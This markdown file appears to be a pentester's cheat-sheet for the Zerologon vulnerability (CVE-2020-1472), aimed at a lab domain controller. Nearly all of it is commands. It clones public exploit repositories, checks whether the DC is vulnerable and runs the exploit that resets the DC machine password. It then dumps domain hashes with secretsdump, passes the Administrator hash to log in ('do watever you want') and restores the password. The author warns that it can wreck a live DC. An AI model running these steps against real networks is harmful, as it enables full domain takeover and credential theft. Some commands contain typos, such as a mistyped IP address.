# DONT RUN THIS ON A PENTEST


## ZEROLOGON CHECK
```sh
> cd /opt
> git clone https://github.com/dirkjanm/CVE-2020-1472
> cd CVE-2020-1472
# copy zerologincheck.py script from https://github.com/SecuraBV/CVE-2020-1472 repository and save in this folder.
# use this script to run a test of domain controller to know if its actually vulnerable

> ./python3 zerologon-check.py <DC Server Name: HYDRA-DC> <DC-IP Address> 

"Its not recommended to run the actual exploit even if its vulnerable. Better to stop after the check. Its not workth destroying a DC of live environment"
```


# ZEROLOGON EXPLOIT
```sh
" It is very risky to exploit this vulnerability. Very high chance or DC to be destructed by this attack if the password is not reset properly after attack"

> ./python3 cve-2020-1472-exploit.py <DC Server Name: HYDRA-DC> <DC-IP Address>

> secretsdump.py -just-dc < <Domain/DC-Server\$@IPAddress>: MARVEL/HYDRA-DC\$@<192.168.138.132> >

# done with attack now. login and do watever you want

# now we are gonna restore this 

> secretsdump.py Administrator@92.168.138.132 -hashes <administrator hash wwe dumped before in last command>

# find a plain password hex string in the output corresponding to the user we attacked

> python3 restorepassword.py <MARVEL\HYDRA-DC@HYDRA-DC -target-ip <192.168.138.132> -hexpass <plain password hex>
```

### Reference: 
https://github.com/dirkjanm/CVE-2020-1472
https://www.trendmicro.com/en_us/what-is/zerologon.html
https://github.com/SecuraBV/CVE-2020-1472
